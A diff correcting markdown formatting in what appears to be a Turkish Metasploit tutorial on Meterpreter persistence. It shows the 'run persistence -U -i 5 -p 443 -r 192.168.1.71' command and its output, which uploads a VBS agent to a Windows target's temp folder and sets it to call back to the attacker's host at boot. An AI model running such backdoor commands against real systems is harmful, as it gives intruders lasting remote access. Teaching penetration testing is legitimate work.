@@ -41,7 +41,7 @@ Hedef sistemde meterpreter oturum açtıktan sonra `persistence.rb` script kodun
 meterpreter > run persistence -h
 
 **[!]** Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
-**[!]** Example: run post/windows/manage/persistence_exe OPTION**=**value **[**...]
+**[!]** Example: run post/windows/manage/persistence_exe OPTION=value [...]
 Meterpreter Script for **creating a persistent backdoor on a target host.
 
 OPTIONS:
@@ -82,7 +82,7 @@ Aşağıdaki `persistence -U -i 5 -p 443 -r 192.168.1.71` komutu hangi işlemler
 
 ```bash
 meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
-> Creating a persistent agent: LHOST**=**192.168.1.71 LPORT**=**443 (interval**=**5 onboot**=**true)
+> Creating a persistent agent: LHOST=192.168.1.71 LPORT=443 (interval=5 onboot=true)
 > Persistent agent script is 613976 bytes long
 > Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
 > Agent executed with PID 492
